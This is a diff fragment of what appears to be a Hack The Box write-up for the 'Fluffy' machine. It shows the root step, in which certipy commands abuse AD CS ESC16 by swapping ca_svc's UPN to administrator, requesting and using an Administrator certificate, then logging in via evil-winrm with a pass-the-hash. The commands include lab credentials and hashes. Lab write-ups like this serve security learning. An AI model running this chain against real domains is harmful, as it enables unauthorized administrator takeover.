+    <p>I then googled ESC16 vulnerability and followed the step in the third article/blog:</p>
+
+    <h3>Steps</h3>
+    <p>Read upn for ca_svc</p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -user ca_svc -dc-ip 10.129.232.88 read</code></pre>
+
+    <p><strong>Change ca_svc's UPN to Administrator</strong></p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn administrator -user ca_svc -dc-ip 10.129.232.88 update</code></pre>
+
+    <p><strong>Request Certificate as Administrator</strong></p>
+    <pre><code>certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -ca 'FLUFFY-DC01-CA' -template 'User'</code></pre>
+
+    <p><strong>Restore ca_svc's Original UPN</strong></p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn ca_svc -user ca_svc -dc-ip 10.129.232.88 update</code></pre>
+    <pre><code>certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain 'fluffy.htb'</code></pre>
+
+    <p>Log in and read root flag</p>
+    <pre><code>evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image7.png" alt="Root Flag Capture">
+
+</body>
+</html>
